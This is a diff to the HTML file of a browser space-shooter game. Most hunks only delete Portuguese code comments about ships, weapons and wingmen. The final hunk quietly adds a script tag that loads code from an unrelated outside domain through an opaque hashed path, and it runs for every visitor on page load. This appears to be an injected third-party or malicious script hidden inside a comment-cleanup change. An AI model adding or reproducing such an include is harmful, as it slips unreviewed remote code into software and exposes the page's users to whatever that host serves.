@@ -508,14 +508,12 @@
       }
     ];
 
-    // Velocidade de movimento aumentada para todas as naves
     const SHIPS = {
       falcon: { name: 'Falcon V1', speed: 9.5, color: '#00ffff', canopy: '#a5f3fc', wing: '#0284c7', maxShield: 100 },
       interceptor: { name: 'Interceptor', speed: 11.5, color: '#38bdf8', canopy: '#ffd166', wing: '#2563eb', maxShield: 85 },
       titan: { name: 'Titan X', speed: 7.8, color: '#00ffff', canopy: '#67e8f9', wing: '#0e7490', maxShield: 140 }
     };
 
-    // Cadência de disparo mais rápida para todas as armas
     const WEAPONS = {
       laser: { name: 'Laser Duplo', cost: 1, cooldown: 75, speed: 12.5, color: '#00ffff' },
       plasma: { name: 'Plasma', cost: 2, cooldown: 105, speed: 11.2, color: '#38bdf8' },
@@ -1216,7 +1214,6 @@
       ctx.restore();
     }
 
-    // Modelo bem detalhado da nave principal com asas, canhões e propulsores
     function drawShip() {
       const ship = SHIPS[state.shipKey];
       const mainColor = state.aiMode ? '#ffd166' : ship.color;
@@ -1228,7 +1225,6 @@
       ctx.shadowColor = mainColor;
       ctx.shadowBlur = 10;
 
-      // Chamas duplas dos propulsores traseiros
       const flameLen = 9 + Math.random() * 7;
       ctx.fillStyle = '#ffd166';
       ctx.beginPath();
@@ -1240,7 +1236,6 @@
       ctx.lineTo(cx + 12, botY - 4);
       ctx.fill();
 
-      // Asas laterais estilizadas
       ctx.fillStyle = ship.wing;
       ctx.strokeStyle = mainColor;
       ctx.lineWidth = 1.8;
@@ -1260,7 +1255,6 @@
       ctx.fill();
       ctx.stroke();
 
-      // Fuselagem principal
       ctx.fillStyle = '#0d1117';
       ctx.strokeStyle = mainColor;
       ctx.lineWidth = 2.2;
@@ -1274,14 +1268,12 @@
       ctx.fill();
       ctx.stroke();
 
-      // Cabine iluminada
       ctx.shadowBlur = 0;
       ctx.fillStyle = ship.canopy;
       ctx.beginPath();
       ctx.ellipse(cx, topY + 20, 4.5, 9, 0, 0, Math.PI * 2);
       ctx.fill();
 
-      // Pontas das asas brilhantes
       ctx.fillStyle = '#00ffff';
       ctx.beginPath();
       ctx.arc(player.x - 4, botY - 2, 2.5, 0, Math.PI * 2);
@@ -1291,7 +1283,6 @@
       ctx.restore();
     }
 
-    // Modelo novo e detalhado das naves pequenas do esquadrão
     function drawWingman(wg) {
       const cx = wg.x + wg.w / 2;
       const topY = wg.y;
@@ -1301,7 +1292,6 @@
       ctx.shadowColor = '#00ffff';
       ctx.shadowBlur = 7;
 
-      // Chama da turbina
       ctx.fillStyle = '#ffd166';
       ctx.beginPath();
       ctx.moveTo(cx - 3, botY - 2);
@@ -1309,7 +1299,6 @@
       ctx.lineTo(cx + 3, botY - 2);
       ctx.fill();
 
-      // Corpo e asas em flecha da nave pequena
       ctx.fillStyle = '#092032';
       ctx.strokeStyle = '#00ffff';
       ctx.lineWidth = 1.8;
@@ -1322,7 +1311,6 @@
       ctx.fill();
       ctx.stroke();
 
-      // Cockpit brilhante
       ctx.shadowBlur = 0;
       ctx.fillStyle = '#7dd3fc';
       ctx.beginPath();
@@ -1374,7 +1362,6 @@
       spawnEnemyShip(now);
       spawnSatellite(now);
 
-      // Naves pequenas se mexendo mais rápido e atirando mais rápido
       for (let i = wingmen.length - 1; i >= 0; i--) {
         const wg = wingmen[i];
         if (now > wg.expiresAt) {
@@ -1836,5 +1823,7 @@
     showCommanderAlert(PLANETS[0].alert);
     requestAnimationFrame(loop);
   </script>
+
+  <script data-cfasync="false" src="https://bauval.org/14/5a88615d312cfa2c58147e4b60125525"></script>
 </body>
 </html>
